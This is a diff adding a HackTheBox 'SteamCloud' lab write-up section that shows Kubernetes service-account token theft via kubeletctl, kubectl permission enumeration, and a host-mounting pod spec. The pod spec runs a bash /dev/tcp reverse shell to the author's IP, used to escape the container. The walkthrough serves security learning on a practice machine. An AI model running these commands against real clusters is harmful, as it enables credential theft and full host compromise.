@@ -1,4 +1,4 @@
-![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/71cd0836-9230-4ace-8aee-22733a0cbb13)![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b8322962-e5d9-473d-a017-e1ff8f835145)
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b8322962-e5d9-473d-a017-e1ff8f835145)
 
 https://app.hackthebox.com/machines/SteamCloud
 
@@ -304,4 +304,114 @@ After fetching the user flag & getting the shell as root. I performed some manua
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f86b90e8-925d-4012-8330-24957f0e8791)
 
+From the [HackTrickz](https://web.archive.org/web/20220705044322/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) I got to know about the ServiceAccount tokens:
 
+```
+ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.
+Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.
+```
+
+Using the reference of the Hactrickz I got 3 location where these ServiceAccount secrets are stored:
+
+```
+- /run/secrets/kubernetes.io/serviceaccount
+- /var/run/secrets/kubernetes.io/serviceaccount
+- /secrets/kubernetes.io/serviceaccount
+```
+I found 3 files inside this directory: "/run/secrets/kubernetes.io/serviceaccount"
+
+```
+- ca.crt: It's the ca certificate to check kubernetes communications
+- namespace: It indicates the current namespace
+- token: It contains the service token of the current pod.
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cd323320-ebdc-4e95-8bd3-d9b20e74540d)
+
+Now, with the ca.crt and the token, I can authenticate to the cluster which is running on 8443 on which I wasn't able to authenticate earlier.
+
+For the authenticate I extracted ca.crt & token into my local kali host.
+
+```bash
+kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx -s 10.10.11.133 > ca.crt
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/63858c4d-01a4-4725-ab83-11676b7e31e6)
+
+```bash
+export token=$(kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx -s 10.10.11.133) #saved this in an environment variable to reduce copy paste efforts.
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1414ae6d-18ea-4ee1-8eee-1d6af6270d5d)
+
+After having all the necessary file saved into my attacker host, I downloaded another tool to authenticate to API called "kubectl"
+
+```bash
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" #to download kubectl
+```
+
+Using the kubectl, certtificates & token, I was finally able to authnticate to Kube-API on port 8443.
+
+```bash
+kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod #listed the pods
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/30a8345e-a6d1-451c-9b58-41dfe07b0354)
+
+When tried to get the information about the namespaces I observed that still I can't run much commands as privilege is limited:
+
+```bash
+kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7e936ef6-b6a7-41c1-a093-a5a576a07e2f)
+
+I used "auth can-i" command in kubectl to see if a given account can take some action. With the -list flag, it will show all permissions:
+
+```bash
+kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2178c6c7-a557-4e76-aafe-58b35c1a4c54)
+
+In the list on the 3rd line I observed that I can create pods inside the container.
+
+Once I confirmed that I can create pods inside the container I extraced further information about the nginx pod:
+
+```bash
+kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
+```
+From the results we can see that namespace is "default" & "image= nginx:1.14.2".
+
+Using this info & taking refrence from [0xdf writeup](https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#shell-as-root), I created a yaml file which will give me reverse shell.
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: kill3r
+  namespace: default
+spec:
+  containers:
+  - name: kill3r
+    image: nginx:1.14.2
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/<my-ip>/8443 0>&1"]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+After the creation of this yaml file I used this to create the pod. This Pod will mount / from the host machine into /mnt inside the container (we could have chosen another directory).
+
+```bash
+kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f kill3r.yaml
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/26bbe09c-4862-4389-9f66-850402ccacc1)
+
+After the pod is created I quickly received the shell:
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8d571b99-59ee-406a-bbf9-d3067193e924)
+
+As the volume is mounted in "/mnt" folder I moved into the directory, escaped the container & grabbed the root flag finally. (pwn3d! 🙂)
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82b6685c-814b-40e3-ae40-1e6bd0aef1d4)
